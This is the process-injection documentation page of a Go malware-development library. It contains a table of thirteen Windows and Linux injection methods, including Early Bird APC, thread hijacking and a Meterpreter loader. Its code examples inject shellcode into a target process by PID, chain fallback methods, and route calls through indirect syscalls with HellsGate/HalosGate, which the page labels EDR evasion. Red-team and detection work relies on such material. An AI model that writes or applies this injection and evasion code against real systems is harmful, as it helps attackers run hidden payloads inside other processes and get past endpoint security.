# Process Injection

[<- Back to README](../README.md)

## Injection Methods

| Method | Constant | Platform | Remote | Syscall Support |
|--------|----------|----------|--------|-----------------|
| CreateRemoteThread | `MethodCreateRemoteThread` ("crt") | Windows | Yes | Yes |
| CreateThread (self) | `MethodCreateThread` ("ct") | Windows | No | Yes |
| QueueUserAPC | `MethodQueueUserAPC` ("apc") | Windows | Yes | Yes |
| Early Bird APC | `MethodEarlyBirdAPC` ("earlybird") | Windows | Spawned | Yes |
| Thread Execution Hijacking | `MethodThreadHijack` ("threadhijack") | Windows | Spawned | Yes |
| RtlCreateUserThread | `MethodRtlCreateUserThread` ("rtl") | Windows | Yes | Yes |
| Direct Syscall | `MethodDirectSyscall` ("syscall") | Windows | No | N/A |
| CreateFiber | `MethodCreateFiber` ("fiber") | Windows | No | Yes |
| Ptrace | `MethodPtrace` ("ptrace") | Linux | Yes | N/A |
| MemFD | `MethodMemFD` ("memfd") | Linux | No | N/A |
| ProcMem (mmap) | `MethodProcMem` ("procmem") | Linux | No | N/A |
| PureGo Shellcode | `MethodPureGoShellcode` ("purego") | Linux | No | N/A |
| PureGo Meterpreter | `MethodPureGoMeterpreter` ("purego-meter") | Linux | No | N/A |

## Remote Injection into an Existing Process

```go
import "github.com/oioio-space/maldev/inject"

shellcode, _ := inject.Read("payload.bin")

cfg := &inject.Config{
    Method: inject.MethodCreateRemoteThread,
    PID:    1234,
}
injector, _ := inject.NewInjector(cfg)
injector.Inject(shellcode)
```

## Injection with Automatic Fallback

```go
cfg := &inject.Config{
    Method:   inject.MethodCreateRemoteThread,
    PID:      1234,
    Fallback: true,
}
// Tries CRT -> QueueUserAPC -> RtlCreateUserThread
err := inject.InjectWithFallback(cfg, shellcode)
```

## Injection with Syscall Bypass (EDR Evasion)

```go
import (
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

cfg := &inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateRemoteThread, PID: 1234},
    SyscallMethod: wsyscall.MethodIndirect,
    // SyscallResolver defaults to Chain(HellsGate, HalosGate) when nil
}
injector, _ := inject.NewWindowsInjector(cfg)
injector.Inject(shellcode)
```
